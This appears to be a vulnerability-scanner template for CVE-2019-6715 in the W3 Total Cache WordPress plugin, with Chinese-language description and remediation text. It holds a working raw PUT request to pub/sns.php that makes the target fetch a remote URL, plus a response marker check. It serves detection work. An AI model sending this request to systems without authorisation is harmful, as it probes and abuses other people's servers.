id: CVE-2019-6715
info:
  name: W3 Total Cache 0.9.2.6-0.9.3 - Unauthenticated File Read / Directory Traversal
  author:
  - l0ne1y
  tags:
  - cve
  - cve2019
  - wordpress
  - wp-plugin
  - ssrf
  description: |-
    WordPress Plugin W3 Total Cache 信息泄露漏洞
    WordPress是WordPress基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。W3 Total Cache plugin是使用在其中的一个SEO（搜索引擎优化）插件。

    WordPress W3 Total Cache插件0.9.4之前版本中的pub/sns.php文件存在信息泄露漏洞。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可利用漏洞获取受影响组件敏感信息。
  reference:
  - https://vinhjaxt.github.io/2019/03/cve-2019-6715
  - http://packetstormsecurity.com/files/160674/wordpress-w3-total-cache-0.9.3-file-read-directory-traversal.html
  - https://nvd.nist.gov/vuln/detail/cve-2019-6715
  severity: high
  classification:
    cve-id:
    - cve-2019-6715
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
  remediation: |-
    官方修复方案：
    1.目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    https://wordpress.org/plugins/w3-total-cache/#developers
requests:
- matchers:
  - type: word
    part: body
    words:
    - TmVzc3VzQ29kZUV4ZWNUZXN0
  raw:
  - |
    PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    {"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://rfi.nessus.org/rfi.txt"}
